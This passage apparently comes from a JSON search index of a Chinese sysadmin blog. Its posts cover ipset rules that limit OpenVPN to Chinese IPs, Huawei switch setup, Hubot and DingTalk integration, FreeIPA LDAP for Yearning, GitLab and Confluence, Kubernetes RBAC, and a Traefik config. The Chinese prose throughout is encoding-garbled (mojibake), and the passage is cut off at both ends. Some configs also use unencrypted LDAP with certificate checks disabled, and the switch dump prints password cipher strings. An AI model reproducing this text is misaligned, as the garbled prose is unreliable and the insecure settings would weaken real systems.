æ¯”å¤§çš„ipåœ°å€åº“ï¼Œå¥½ä¸å®¹æ˜“æ‰¾äº†ä¸€ä¸ªå¯ç”¨çš„ã€‚\nè®°å½•ä¸‹æ¥ï¼Œå¤‡ç”¨ï¼ŒåŸç†å¾ˆç®€å•ï¼Œipsetå»ºç«‹ä¸€ä¸ªchinaçš„hashsetï¼Œä¸åœæ·»åŠ æ¡ç›®ï¼Œæœ€åç”¨iptalbesé˜»æŒ¡ä¸€ä¸‹ï¼š\n1#!/bin/sh 2ipset create china hash:net hashsize 10000 maxelem 1000000 3ipset add china 1.0.1.0/24 4...... 5ipset add china 91.234.36.0/24 6iptables -I INPUT -m set --match-set china src -p udp -m udp --dport 1194 -j ACCEPT 7iptables -A INPUT -p udp --dport 1194 -j DROP ç›¸åº”è„šæœ¬çš„ä¸‹è½½ï¼š\nipset-rules.txt ","date":"2023-03-29","img":"","permalink":"https://rendoumi.com/posts/20230329-ipset_block/","series":null,"tags":null,"title":"ä½¿ç”¨ipsetæ¥ç¦æ­¢å›½å¤–çš„ç”¨æˆ·ç™»å½•openvpn"},{"categories":null,"content":"æ¢äº†å…¬å¸ï¼Œä¹Ÿæèµ·äº†æ¡Œé¢è¿ç»´ï¼Œé…ç½®äº¤æ¢æœºçš„è¿‡ç¨‹è®°å½•ä¸€ä¸‹ï¼Œå…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯å‘½ä»¤è®°ä¸ä½ã€‚\næ‹¿åˆ°ä¸€å°åä¸ºäº¤æ¢æœºï¼Œé‡æ–°åˆå§‹åŒ–åï¼Œé…ç½®å¦‚ä¸‹ï¼š\n1\u0026lt;HUAWEI\u0026gt;dis cur 2!Software Version V200R008C00SPC500 3# 4sysname HUAWEI 5# 6aaa 7 authentication-scheme default 8 authorization-scheme default 9 accounting-scheme default 10 domain default 11 domain default_admin 12 local-user admin password irreversible-cipher %^%#7:.iL]+u\u0026#34;4\\j8ZFhGeg/-m.\u0026amp;\u0026#34;^0}kMznjk%\u0026gt;;BaUDO/\u0026#39;6m\\X\\=V8JGY:W;i,%^%# 13 local-user admin service-type http 14# 15interface Vlanif1 16# 17interface MEth0/0/1 18# 19interface GigabitEthernet0/0/1 20# 21interface NULL0 22# 23user-interface con 0 24 authentication-mode password 25 set authentication password cipher $1a$~!;$-JF0-W$Z\u0026gt;\u0026lt;1.F]\u0026lt;sF.R_NBj34CJ/JPe=/tZDMM(Ws3\u0026#39;9u%+$ 26user-interface vty 0 4 27user-interface vty 16 20 28# 29return ä¸€ã€é…åç§° 1sysname BJ_FANGHENG_JIERU äºŒã€é…ç½®ç™»å½•ç”¨æˆ· 11ã€aaa 2local-user admin password irreversible-cipher abcdefg 3local-user admin privilege level 3 4local-user admin service-type telnet terminal ssh 5 62ã€user-interface con 0 7authentication-mode aaa 8 93ã€user-interface vty 0 4 10authentication-mode aaa 11protocol inbound all ä¸‰ã€é…ç½®ä¸‹è”äº¤æ¢æœºç«¯å£ 1interface GigabitEthernet0/0/23 2 description == H3cSW --\u0026gt; 24 3 port link-type trunk 4 port trunk allow-pass vlan 2 to 4094 å››ã€é…ç½®ä¸Šè”äº¤æ¢æœºç«¯å£ 1interface GigabitEthernet0/0/24 2 description == RuijieRoute --\u0026gt; lan0 3 port link-type trunk 4 port trunk allow-pass vlan 2 to 4094 äº”ã€é…ç½®vlanåœ°å€ 1vlan 11 2vlan 100 3 4vlan 11 5 interface Vlanif11 6 ip address 10.8.0.7 255.255.254.0 7 8vlan 100 9 interface Vlanif100 10 ip address 192.168.10.7 255.255.255.0 å…­ã€é…ç½®ç¼ºçœè·¯ç”± 1ip route-static 0.0.0.0 0.0.0.0 10.8.0.1 ä¸ƒã€æ‰¹é‡é…ç½®ç«¯å£ 1port-group group-member GigabitEthernet0/0/1 to GigabitEthernet0/0/23 2port link-type access 3port default vlan 11 4stp edged-port enable å…«ã€lldp 1lldp enable ä¹ã€dhcp 1dhcp enable 2ip pool 11 3 gateway-list 10.8.0.1 4 network 10.8.0.0 mask 255.255.254.0 5 static-bind ip-address 10.8.0.4 mac-address 8005-88f1-fa62 6 dns-list 114.114.114.114 7 8interface Vlanif11 9 description === Ke hu duan 10 ip address 10.8.0.1 255.255.254.0 11 dhcp select global åã€telnetå’Œssh 1dsa local-key-pair create 2 3telnet server enable 4 5stelnet server enable 6ssh authentication-type default password è¿™æ ·å°±å®Œæˆäº†ä¸€å°æ ¸å¿ƒè®¾å¤‡çš„ç®€å•é…ç½®\n","date":"2023-03-24","img":"","permalink":"https://rendoumi.com/posts/20230324-huawei_switch/","series":null,"tags":null,"title":"æ ¸å¿ƒäº¤æ¢æœºçš„é…ç½®è¿‡ç¨‹"},{"categories":null,"content":"æ¢äº†å…¬å¸ï¼Œç°åœ¨çš„å…¬å¸ç”¨çš„æ˜¯é’‰é’‰ï¼Œä¸æ˜¯ä¼ä¸šå¾®ä¿¡ï¼Œé‚£ä¹ˆ hubot å°±å¾—æ”¹æ¥å…¥é’‰é’‰äº†\nå‰æ–‡å›é¡¾ï¼šHuboté›†æˆä¼ä¸šå¾®ä¿¡+jenkins+ansible ä¸æ˜ç™½çš„å¯ä»¥å…ˆçœ‹é‚£ä¸€ç¯‡ï¼Œé‚£ä¹ˆé¦–å…ˆçš„æ­¥éª¤æ˜¯ä¸€æ ·çš„ï¼ŒåŒæ ·è¦å»é’‰é’‰å¼€æ”¾å¹³å°ï¼Œç”¨ç®¡ç†å‘˜ç™»å½•ï¼š\nhttps://open.dingtalk.com/ ç™»é™†åï¼Œç‚¹å‡»åº”ç”¨å¼€å‘\u0026ndash;\u0026gt;ä¼ä¸šåº”ç”¨å¼€å‘ï¼š\nâ€™\nç„¶ååº”ç”¨å¼€å‘ï¼Œæœºå™¨äººï¼Œç‚¹å‡»åˆ›å»ºåº”ç”¨ï¼š\nå»ºå¥½åï¼Œç‚¹å‡»åº”ç”¨ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨å‡­è¯\næˆ‘ä»¬è®°å½•ä¸‹æ¥ AppSecretï¼Œä¹‹åè¦ç”¨åˆ°\nç„¶åå†ç‚¹å‡»å¼€å‘ç®¡ç†ï¼Œè¿™é‡Œéœ€è¦ä½ æŠŠ hubot çš„æœåŠ¡å™¨åœ°å€ç»™å…¬å¸ƒå‡ºå»ï¼Œéœ€è¦æœ‰ä¸ªå…¬ç½‘åœ°å€\nå› ä¸ºhubotæ˜¯ç›‘å¬çš„8080ç«¯å£ï¼Œæ‰€ä»¥æ˜ å°„æ˜¯ xxxx.ip:80 \u0026ndash;\u0026gt; hubotip:8080\næœåŠ¡å™¨å‡ºå£ IP çš„åœ°æ–¹ , éœ€è¦åœ¨ hubot çš„æœåŠ¡å™¨ä¸Šï¼Œcurl http://ipinfo.io ï¼Œå¾—åˆ°åœ°å€ï¼Œç„¶åå¡«ä¸Šï¼ˆæˆ‘ä»¬çš„ ip éå¸¸ç‰¹æ®Šï¼Œæ¯ä¸€æ¬¡è®¿é—®éƒ½æœ‰å¯èƒ½ä¼šæ¢ä¸ªipï¼Œæ‰€ä»¥åªå¥½æŠŠæ•´æ®µå¡«å†™è¿›å»ï¼Œè€Œä¸”æŠŠå…¬ç½‘æ˜ å°„ipä¹Ÿå¡«è¿›å»ï¼‰\næ¶ˆæ¯æ¥æ”¶åœ°å€å¡«ä¸Šæ˜ å°„åçš„åœ°å€ï¼šhttps://bot.rendoumi.com/hubot/dingtalk/message/ï¼ˆç”¨ä¸ç”¨nginxåŠ è¯ä¹¦å˜httpséšå…·ä½“æƒ…å†µå®šï¼‰\nç„¶åå»hubotå®‰è£…dingtalkæ’ä»¶ï¼Œåœ¨hubotå®‰è£…æ ¹ç›®å½•è¿è¡Œ\n1npm install hubot-dingtalk 2 3export HUBOT_DINGTALK_AUTH_TYPE=sign 4export HUBOT_DINGTALK_SECRET=xxxxxxxxxx 5export HUBOT_DINGTALK_MODE=1 6 7./bin/hubot -a dingtalk ç„¶åæˆ‘ä»¬å»ç”¨æµè§ˆå™¨è®¿é—® https://bot.rendoumi.com/hubot/dingtalk/message/ï¼Œä¼šè¿”å›è¿™ä¸ª\nç„¶åå°±å¯ä»¥äº†ã€‚è‡³äºæŠŠ hubot åšæˆæœåŠ¡ï¼Œå°±å‚è€ƒä¸Šä¸€ç¯‡æ–‡ç« ï¼ŒæŠŠjenkinså’Œansibleéƒ½åŠ ä¸Šï¼Œåšä¸€ä¸ªå¥½ç”¨çš„æœºå™¨äººã€‚\n","date":"2023-03-01","img":"","permalink":"https://rendoumi.com/posts/20230301-hubot_dingding/","series":null,"tags":null,"title":"Huboté›†æˆä¼ä¸šé’‰é’‰"},{"categories":null,"content":"æ¥ä¸Šä¸Šä¸€ç¯‡ï¼ŒFreeipaæ¥å®Œconfluenceï¼Œæ¥ä¸‹æ¥æ˜¯æ¥å…¥æ•°æ®åº“ä¸Šçº¿è½¯ä»¶Yearning.\nå…ˆä¸‹ç»“è®ºï¼šåŒæ ·å­˜åœ¨å…ˆæœ‰ Yearning è´¦æˆ·ã€ç„¶åæ‰æœ‰çš„ FreeIPA LDAP ç›®å½•ï¼Œè¿™æ¬¡è¦å‘½äº†ï¼Œå› ä¸º Yearning ä¸æ”¯æŒ LDAP è®¤è¯æ–¹å¼ç”¨æˆ·ä¸å·²æœ‰ç”¨æˆ·è¿›è¡Œåˆå¹¶ï¼æ‰€ä»¥ï¼Œç­‰äºldapæ–°å»ºäº†ä¸€ä¸ªç”¨æˆ·ï¼Œè·Ÿè€ç”¨æˆ·çš„é‚®ç®±ä¸€æ¨¡ä¸€æ ·ï¼Œä½†æ˜¯æ˜¯ä¸ª Newbeeï¼Œæ²¡æœ‰æƒé™ï¼Œéœ€è¦é‡æ–°èµ‹æƒã€‚æ¯”è¾ƒéº»çƒ¦ï¼å¸Œæœ›ä¹‹åèƒ½prä¿®æ”¹ä¸€ä¸‹ï¼ï¼ï¼ï¼\nè¿æ¥å±æ€§å¦‚ä¸‹ï¼š\n1ldapåœ°å€ï¼šfreeipa.bybon.cn:389 2 3LDAPç®¡ç†å‘˜DNï¼šuid=manager,cn=users,cn=accounts,dc=bybon,dc=cn 4LDAPç®¡ç†å‘˜å¯†ç ï¼šxxxxxx 5 6LDAP_Search Filterï¼š(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=confluence-users,cn=groups,cn=accounts,dc=bybon,dc=cn)(uid=%s)) 7 8LDAP_SCBASEï¼šcn=users,cn=accounts,dc=bybon,dc=cn 9 10LDAPç”¨æˆ·å±æ€§ï¼š{ \u0026#34;real_name\u0026#34;: \u0026#34;displayName\u0026#34;, \u0026#34;email\u0026#34;: \u0026#34;mail\u0026#34;, \u0026#34;department\u0026#34;: \u0026#34;æŠ€æœ¯ä¸­å¿ƒ\u0026#34; } è§£é‡Šä¸€ä¸‹ï¼š\nLDAP_Search Filter æŒ‡æœç´¢ç”¨æˆ·æ—¶æ‰€ç”¨çš„filterï¼Œè¿™é‡Œå·äº†ä¸ªæ‡’ï¼ŒæŒ‰é“ç†åº”è¯¥æ˜¯ç‹¬ç«‹å»ºä¸€ä¸ªç»„yearning-usersï¼Œæ‡’å¾—å¹²äº†ï¼Œå¤ç”¨confluence-userså¥½äº†ã€‚adminç»„æ›´æ‡’å¾—å»ºï¼Œå¿…é¡»ç”¨freeipaçš„adminsç»„\nLDAP_SCBASE æŒ‡æœç´¢ç”¨æˆ·çš„BASE DN\nLDAPç”¨æˆ·å±æ€§æŒ‡yearningä¸­çš„å±æ€§ä¸ldapå±æ€§ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œdepartmentæ˜¯æ²¡æœ‰å¯¹åº”çš„ï¼Œä¹Ÿæ²¡æœ‰äººä¼šæ²¡äº‹å¹²å»ºä¸€ä¸ªå»å§ã€‚\næˆªå›¾å¦‚ä¸‹ï¼š\n","date":"2023-02-28","img":"","permalink":"https://rendoumi.com/posts/20230228-freeipa_yearning/","series":null,"tags":null,"title":"Yearningé›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯"},{"categories":null,"content":"k8sé‡Œé¢å»ºç«‹ä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åç»™ç‰¹å®šæƒé™ï¼Œå†åšrolebindingçš„è¿‡ç¨‹ï¼Œç»™ä¸ªæ ‡å‡†çš„å»ºç«‹jenkins-adminçš„ç”¨æˆ·çš„è¿‡ç¨‹ï¼š\nç®€å•æ¥è¯´ï¼Œä¸‰æ­¥ï¼ŒServiceAccout \u0026ndash;\u0026gt; Role \u0026ndash;\u0026gt; Rolebinding\n1apiVersion: v1 2kind: ServiceAccount 3metadata: 4 name: jenkins-admin 5 namespace: devops-tools 6--- 7apiVersion: rbac.authorization.k8s.io/v1 8kind: Role 9metadata: 10 name: jenkins 11 namespace: default 12 labels: 13 \u0026#34;app.kubernetes.io/name\u0026#34;: \u0026#39;jenkins\u0026#39; 14rules: 15- apiGroups: [\u0026#34;\u0026#34;] 16 resources: [\u0026#34;pods\u0026#34;] 17 verbs: [\u0026#34;create\u0026#34;,\u0026#34;delete\u0026#34;,\u0026#34;get\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;patch\u0026#34;,\u0026#34;update\u0026#34;,\u0026#34;watch\u0026#34;] 18- apiGroups: [\u0026#34;\u0026#34;] 19 resources: [\u0026#34;pods/exec\u0026#34;] 20 verbs: [\u0026#34;create\u0026#34;,\u0026#34;delete\u0026#34;,\u0026#34;get\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;patch\u0026#34;,\u0026#34;update\u0026#34;,\u0026#34;watch\u0026#34;] 21- apiGroups: [\u0026#34;\u0026#34;] 22 resources: [\u0026#34;pods/log\u0026#34;] 23 verbs: [\u0026#34;get\u0026#34;,\u0026#34;list\u0026#34;,\u0026#34;watch\u0026#34;] 24- apiGroups: [\u0026#34;\u0026#34;] 25 resources: [\u0026#34;secrets\u0026#34;] 26 verbs: [\u0026#34;get\u0026#34;] 27--- 28apiVersion: rbac.authorization.k8s.io/v1 29kind: RoleBinding 30metadata: 31 name: jenkins-role-binding 32 namespace: default 33roleRef: 34 apiGroup: rbac.authorization.k8s.io 35 kind: Role 36 name: jenkins 37subjects: 38- kind: ServiceAccount 39 name: jenkins-admin 40 namespace: default èµ„æºçš„é“¾æ¥ï¼šhttps://kubernetes.io/zh-cn/docs/reference/access-authn-authz/rbac/\n","date":"2023-02-22","img":"","permalink":"https://rendoumi.com/posts/20230222-kubernetes_rbac/","series":null,"tags":null,"title":"Kubernetesä¸­ç”¨æˆ·rbacçš„å»ºç«‹"},{"categories":null,"content":"æ¥ä¸Šä¸€ç¯‡ï¼ŒFreeipaæ¥å®Œconfluenceï¼Œæ¥ä¸‹æ¥æ˜¯æ¥å…¥Gitlab.\nå…ˆä¸‹ç»“è®ºï¼šåŒæ ·é“ç†ï¼Œä¹Ÿæ˜¯å­˜åœ¨å…ˆæœ‰ Gitlab è´¦æˆ·ã€ç„¶åæ‰æœ‰çš„ FreeIPA LDAP ç›®å½•ï¼Œè¿™ä¹Ÿä¸è¦ç´§ï¼Œå› ä¸º Gitlab åŒæ ·æ”¯æŒ LDAP è®¤è¯æ–¹å¼çš„ç”¨æˆ·ä¸ç°æœ‰ç”¨æˆ·è¿›è¡Œåˆå¹¶ã€‚\nä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœæˆ‘å·²ç»åœ¨ Gitlab ä¸­åˆ›å»ºäº†ç”¨æˆ·åä¸º zhangranruiã€é‚®ç®±ä¸º zhangranrui@rendoumi.com çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘åœ¨ LDAP ç›®å½•ä¸­åªéœ€è¦æŠŠ mail å­—æ®µä¹Ÿå†™æˆ zhangranrui@rendoumi.com å³å¯è¢« Gitlab è¯†åˆ«æˆåŒä¸€ç”¨æˆ·ã€‚æˆ–è€…è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Gitlab ä¸­å¢åŠ  LDAP ç›®å½•ä¸­çš„ mail å­—æ®µçš„é‚®ç®±ï¼ˆGitlab æ”¯æŒåŒä¸€ç”¨æˆ·ç»‘å®šå¤šä¸ªé‚®ç®±ï¼‰ï¼Œè¿™æ ·åœ¨ Gitlab ä¸­ä½¿ç”¨ LDAP è®¤è¯çš„æ—¶å€™ä¹Ÿä¼šè¢«è§†ä¸ºåŒä¸€ç”¨æˆ·ã€‚è·Ÿ Confluence æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚\næ³¨æ„ï¼šè¿™æ ·æ”¹äº†ä¹‹åï¼Œæ— è®ºç™»å½•æˆ–æ˜¯æ‹‰å–ä»£ç ï¼Œå°±åªèƒ½ä½¿ç”¨LDAPçš„è´¦å·å¯†ç ï¼Œä¸èƒ½ä½¿ç”¨æ—§çš„ GitLab Standard çš„è´¦å·ã€‚\næˆ‘ä»¬çš„ Gitlab ç‰ˆæœ¬æ¯”ä»·è€11.1.0ï¼Œæ‰€ä»¥æ”¹çš„æ˜¯ gitlab.yml\n1 ldap: 2 enabled: true 3 servers: 4 main: # \u0026#39;main\u0026#39; is the GitLab \u0026#39;provider ID\u0026#39; of this LDAP server 5 label: \u0026#39;LDAP\u0026#39; 6 7 host: \u0026#39;freeipa.bybon.cn\u0026#39; 8 port: 389 9 uid: \u0026#39;uid\u0026#39; 10 11 encryption: \u0026#39;plain\u0026#39; # \u0026#34;start_tls\u0026#34; or \u0026#34;simple_tls\u0026#34; or \u0026#34;plain\u0026#34; 12 verify_certificates: false 13 ca_file: \u0026#39;\u0026#39; 14 ssl_version: \u0026#39;\u0026#39; 15 16 bind_dn: \u0026#39;uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn\u0026#39; 17 password: \u0026#39;xxxxxx\u0026#39; 18 19 timeout: 10 20 21 active_directory: false 22 allow_username_or_email_login: false 23 24 block_auto_created_users: false 25 26 base: \u0026#39;dc=bybon,dc=cn\u0026#39; 27 28 user_filter: \u0026#39;(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=gitlab-users,cn=groups,cn=accounts,dc=bybon,dc=cn))\u0026#39; 29 30 attributes: 31 username: [\u0026#39;uid\u0026#39;] 32 email: [\u0026#39;mail\u0026#39;] 33 34 name: \u0026#39;displayName\u0026#39; 35 first_name: \u0026#39;givenName\u0026#39; 36 last_name: \u0026#39;sn\u0026#39; 37 38 lowercase_usernames: false 39 æ–°ç‰ˆæœ¬çš„è¯ï¼ŒæŒ‰å­—æ®µæ¯”è¾ƒå³å¯ã€‚æ³¨æ„ä¸Šé¢ï¼Œæˆ‘æ˜¯æå‰å»ºç«‹äº†ä¸€ä¸ª gitlab-users çš„ç»„ï¼ŒæŠŠç”¨æˆ·å…ˆéƒ½æ”¾è¿›ç»„é‡Œï¼Œè¿™æ ·æ–¹ä¾¿ç®¡ç†ã€‚\n","date":"2023-02-17","img":"","permalink":"https://rendoumi.com/posts/20230217-freeipa_gitlab/","series":null,"tags":null,"title":"Gitlabé›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯"},{"categories":null,"content":"å…¬å¸å†³å®šç”¨ç»Ÿä¸€ç”¨æˆ·ç®¡ç†ç³»ç»Ÿï¼Œé‚£å¿…ç„¶æ˜¯å¾®è½¯çš„ AD å’Œå¼€æºçš„ LDAP äºŒé€‰ä¸€äº†\nè‡ªç„¶ç”¨ Freeipa ä½œä¸ºé¦–é€‰ã€‚\nèŠ±æ—¶é—´ä»”ç»†è°ƒç ”äº†ä¸€ä¸‹ï¼Œå…ˆè¯´ç»“è®ºï¼š\nå¦‚æœ confluence å·²ç»æœ‰å¾ˆå¤šç”¨æˆ·ï¼Œé‚£ä¹ˆå¯¹ä¸èµ·ï¼Œè¿™äº›ç”¨æˆ·çš„å¯†ç éƒ½å¿…é¡»é€šçŸ¥åˆ°ä¸ªäººï¼Œå¼ºåˆ¶è¿›è¡Œä¿®æ”¹ï¼Œæ—§æœ‰çš„å¯†ç å®Œå…¨æ— æ³•å¯¼å‡ºï¼ˆé™¤éä¸€ä¸ªä¸€ä¸ªäººé—®å‡ºæ¥ï¼‰ã€‚\nconfluence å®é™…ä¸Šæ˜¯ç”¨äº†ä¸€ä¸ªå†…ç½®çš„ç›®å½•è½¯ä»¶æ¥ç®¡ç†ç”¨æˆ·çš„ï¼Œç”¨æˆ·å”¯ä¸€å­˜åœ¨çš„å‡­æ®å°±æ˜¯é‚®ç®±ã€‚\nconfluence æ”¯æŒåŒæ—¶ä»å¤šä¸ªç›®å½•æ ‘ä¸­æŒ‰ç…§é¡ºåºæ¥æŸ¥è¯¢ç”¨æˆ·ï¼ŒæŸ¥è¯¢åˆ°çš„ç»“æœä¼šåˆå¹¶ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œæ’ç¬¬ä¸€çš„ç›®å½•æ ‘æ˜¯freeipaï¼Œæ’ç¬¬äºŒä½çš„ç›®å½•æ ‘æ˜¯å†…ç½®ç›®å½•ï¼Œä¸¤ä¸ªç›®å½•æ ‘éƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ï¼Œä¸¤æ¡è®°å½•çš„é‚®ä»¶æ˜¯ä¸€è‡´çš„ï¼Œé‚£ä¹ˆä¼šåœ¨æ’ç¬¬ä¸€çš„ freeipa æ ‘ä¸­è®¤è¯ç”¨æˆ·ï¼Œä½†ä¼šæŠŠä¸¤ä¸ªç›®å½•æ ‘ä¸­ç”¨æˆ·çš„ä¿¡æ¯æ‹¼æ¥åˆå¹¶èµ·æ¥æ€»ä½“è¿”å›ã€‚\nè¿™æ ·å°±æ˜ç™½äº†æŠŠï¼Œæˆ‘ä»¬åªç”¨ç¬¬ä¸€ä¸ª freeipa ç›®å½•æ ‘æ¥è®¤è¯ç”¨æˆ·ï¼ŒåŸæœ‰çš„ç»„æƒé™è¿˜æ˜¯ç”¨ç¬¬äºŒä¸ªå†…ç½®ç›®å½•æ ‘ä¸­çš„ä¿¡æ¯ï¼Œä¿æŒä¸¤æ£µæ ‘ä¸­ç”¨æˆ·çš„ mail ä¿æŒä¸€è‡´å³å¯ï¼Œæ­¥éª¤å¦‚ä¸‹ã€‚\næˆ‘ä»¬é¦–å…ˆè¦æå‰åœ¨freeIPAé‡Œé¢å»ºç«‹ä¸¤ä¸ªç»„ï¼š\nconfluence-administrators\nconfluence-users\nç„¶åè·‘åˆ° Confluence é‡Œï¼Œç”¨æˆ·ç›®å½•ï¼Œæ·»åŠ ä¸€ä¸ª freeipa çš„ç›®å½•æœåŠ¡æ”¾åœ¨å‰é¢\nè¯¦ç»†é…ç½®çš„å‚æ•°å¦‚ä¸‹ï¼š\n1é…ç½®å¦‚ä¸‹ï¼š 2 3Server Settings: 4- Namel: freeipa 5- Directory Type: OpenLDAP 6- Server: example.com 7- Port: 389 8- Use SLL: false 9- Username: uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn 10- Password: \u0026lt;insert password here\u0026gt; 11 12 13LDAP Schema: 14- Base DN: dc=bybon,dc=cn 15- Additional User DN: cn=users,cn=accounts 16- Additional Group DN:cn=groups,cn=accounts 17 18 19LDAP Permissions: 20Select Read/Write 21 22 23Advanced Settings: Default 24 25 26User Schema Settings 27- User Object Class: inetorgperson 28- User Object Filter: (\u0026amp;(objectclass=inetorgperson)(memberOf=cn=confluence-users,cn=groups,cn=accounts,dc=bybon,dc=cn)) 29- User Name Attribute: uid 30- User Name RDN Attribute: uid 31- User First Name Attribute: giveName 32- User Last Name Attribute: sn 33- User Display Name Attribute: displayName 34- User Email Attribute: mail 35- User Password Attribute: userPassword 36- User Password Encryption: SHA 37- User Unique ID Attribute: uid 38 39 40Group Schema Settings 41- Group Object Class: groupofnames # all lowercase 42- Group Object Filter: (objectclass=groupofnames) # all lowercase 43- Group Name Attribute: cn 44- Group Description Attribute: description 45 46 47Membership Schema Settings 48- Group Members Attribute: member #lowercase 49- User Membership Attribute:memberOf 50 51 52 æ”¾å…¨ä¸­æ–‡çš„å›¾å¦‚ä¸‹ï¼š\næŠ˜ç£¨äº†å¾ˆä¹…æ‰å¼„å‡ºæ¥ï¼ŒéªŒè¯ä¸€ä¸‹ç”¨æˆ·ï¼š\nè·‘åˆ° confluence é‡Œé¢æŸ¥çœ‹ï¼Œæ˜æ˜¾æ˜¯ä¸¤ä¸ªç›®å½•æ ‘åˆå¹¶çš„ç»“æœï¼š\nå…³äº admin çš„é—®é¢˜ï¼Œæ³¨æ„ä¸€ä¸‹ï¼Œæˆ‘ä»¬ä¸Šé¢æ‰¾ç”¨æˆ·çš„ filter æ˜¯æ‰¾ä¸åˆ° admin ç”¨æˆ·çš„ã€‚ä½†æ˜¯ç¬¬ä¸€æ­¥è®¤è¯æ˜¯ ldap åšçš„ï¼Œè®¤è¯è¿‡äº†ä»¥åï¼Œfreeipa çš„ ldap filter è¿‡æ»¤åæ‰¾ä¸åˆ° admin è¿™ä¸ªç”¨æˆ·ï¼Œæ‰€ä»¥åªä¼šåœ¨å†…ç½®ç›®å½•æœ‰ admin çš„ä¿¡æ¯ï¼Œä¸‹é¢éªŒè¯ä¸€ä¸‹ï¼Œadmin åªå­˜åœ¨äº Confluence Internal Directory ä¸­ã€‚\nå†è¡¥å……ä¸€ç‚¹ï¼Œfreeipa æ˜¯å¯ä»¥åŒ¿åè®¿é—®çš„ï¼Œä½†æ˜¯åŒ¿åçŠ¶æ€ä¸‹ï¼Œä¸€äº›å±æ€§å­—æ®µæ˜¯çœ‹ä¸è§çš„ï¼Œæ¯”å¦‚ mail ã€‚\næ‰€ä»¥æƒ³è¦æŸ¥åˆ°å…¨éƒ¨å­—æ®µï¼Œå¿…é¡»ç™»å½•ï¼Œæ”¾ä¸€ä¸ªæŸ¥è¯¢çš„è„šæœ¬ï¼š\n1ldapsearch -W -D uid=admin,cn=users,cn=accounts,dc=bybon,dc=cn -h localhost -b cn=users,cn=accounts,dc=bybon,dc=cn \u0026#39;(\u0026amp;(objectclass=inetorgperson)(memberOf=cn=confluence-users,cn=groups,cn=accounts,dc=bybon,dc=cn))\u0026#39; ","date":"2023-02-16","img":"","permalink":"https://rendoumi.com/posts/20230216-freeipa_confluence/","series":null,"tags":null,"title":"Confluenceé›†æˆè¿›freeIPAè¿›è¡Œç»Ÿä¸€è®¤è¯"},{"categories":null,"content":"nginxå’Œtraefikéƒ½å¯ä»¥åšingressï¼Œåœ¨å…¥å£å¤„åšè¯ä¹¦çš„å¸è½½ï¼Œå¹¶è½¬å‘tcpã€udpã€httpsã€httpæµé‡\nnginxæ˜¯æ¯”è¾ƒé€šå¸¸çš„åšæ³•ï¼Œtraefiké…ç½®æ¯”è¾ƒç®€å•ï¼Œå°¤å…¶æ˜¯é…ç½®è‡ªåŠ¨ç»­ç­¾çš„è¯ä¹¦\n1wget https://github.com/traefik/traefik/releases/download/v2.4.8/traefik_v2.4.8_linux_amd64.tar.gz è§£å‹é‡Šæ”¾å‡ºæ¥traefikæ–‡ä»¶ï¼Œå»ºç«‹ç›®å½•/export/servers/traefik\nç»“æ„å¦‚ä¸‹ï¼š\ntraefik.yml\n1log: 2 level: DEBUG 3 4api: 5 insecure: false 6 dashboard: true 7 8entryPoints: 9 http: 10 address: \u0026#34;:80\u0026#34; 11 #http: 12 # redirections: 13 # entryPoint: 14 # to: https 15 # scheme: https 16 17 https: 18 address: \u0026#34;:443\u0026#34; 19 20 21 22certificatesResolvers: 23 letsEncrypt: 24 acme: 25 storage: /export/servers/traefik/acme.json 26 email: zhangranrui@rendoumi.com 27 tlsChallenge: {} 28 httpChallenge: 29 entryPoint: http 30 31providers: 32 file: 33 directory: /export/servers/traefik/dynamic 34 watch: true ä¸Šé¢æˆ‘ä»¬å®šä¹‰äº†logçš„levelä¸ºDEBUGï¼Œå¹¶ä¸”å¼€æ”¾äº†dashboard\nå®šä¹‰äº†2ä¸ªå…¥å£ï¼Œhttpå’Œhttpsï¼Œå¯ä»¥ç›´æ¥ç”¨ä¸­é—´ä»¶å¼ºåˆ¶httpè·³è½¬https\nç„¶åå®šä¹‰äº†letsEncryptçš„è¯ä¹¦æœºæ„\næœ€åå®šä¹‰äº†åŠ¨æ€ç›‘æ§ /export/servers/traefik/dynamic ç›®å½•ï¼Œå¦‚æœä¸‹é¢æœ‰å¢åŠ æ–‡ä»¶ä¼šè‡ªåŠ¨æ›´æ–°é…ç½®ã€‚\nç„¶åå†dynamicç›®å½•ä¸‹å®šä¹‰è½¬å‘routes\næ³¨æ„å‘½åæ–‡ä»¶ï¼Œtest7æ˜¯åŸŸåï¼Œ01æ˜¯åºåˆ—å·ï¼Œæ–‡ä»¶å†…å®¹ä¸­svcçš„åºåˆ—å·æœ€å¥½è·Ÿæ–‡ä»¶åä¸€è‡´ï¼Œå¦‚æœå¤šæ–‡ä»¶é‡å¤ä¼šå¯¼è‡´é…ç½®ä¸å¯ç”¨ï¼ï¼ï¼\ntest7-01.yml\n1http: 2 routers: 3 https_01: 4 rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34; 5 service: svc_01 6 tls: 7 certresolver: letsEncrypt 8 9 http: 10 rule: \u0026#34;Host(`test7.ddky.com`)\u0026#34; 11 service: svc_01 12 entryPoints: 13 - http 14 15 services: 16 svc_01: 17 loadBalancer: 18 servers: 19 - url: \u0026#34;http://172.16.8.1:80\u0026#34; test8-02.yml\n1http: 2 routers: 3 https_02: 4 rule: \u0026#34;Host(`test8.ddky.com`)\u0026#34; 5 service: svc_02 6 tls: 7 certresolver: letsEncrypt 8 9 http_02: 10 rule: \u0026#34;Host(`test8.ddky.com`)\u0026#34; 11 service: svc_02 12 entryPoints: 13 - http 14 15 services: 16 svc_02: 17 loadBalancer: 18 servers: 19 - url: \u0026#34;http://172.18.31.33:80\u0026#34; dashboard.yml\n1http: 2 routers: 3 api-router: 